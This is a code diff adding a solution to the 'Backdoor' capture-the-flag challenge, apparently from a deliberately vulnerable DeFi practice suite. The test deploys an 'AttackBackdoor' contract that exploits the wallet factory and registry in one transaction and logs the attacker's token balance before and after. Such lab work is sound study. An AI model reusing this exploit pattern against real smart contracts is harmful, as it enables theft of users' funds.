@@ -46,6 +46,36 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackerToken = token.connect(player);
+        const attackerFactory = walletFactory.connect(player);
+        const attackerMasterCopy = masterCopy.connect(player);
+        const attackerWalletRegistry = walletRegistry.connect(player);
+
+        // Helper Function
+        const checkTokenBalance = async (address, name) => {
+            const tokenBal = await attackerToken.balanceOf(address);
+            console.log(`TOKEN Balance of ${name}`, ethers.utils.formatEther(tokenBal));
+        }
+
+        await checkTokenBalance(player.address, "Attacker");
+
+        // Deploy attacking contract
+        // Do exploit in one transaction in contract constructor
+
+        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", player);
+        const attackModule = await AttackModuleFactory.deploy(
+            player.address,
+            attackerFactory.address,
+            attackerMasterCopy.address,
+            attackerWalletRegistry.address,
+            attackerToken.address,
+            users,
+            {
+                gasLimit: 1e7
+            }
+        );
+        console.log("Deployed attacking contract at", attackModule.address);
+        await checkTokenBalance(player.address, "Attacker");
     });
 
     after(async function () {
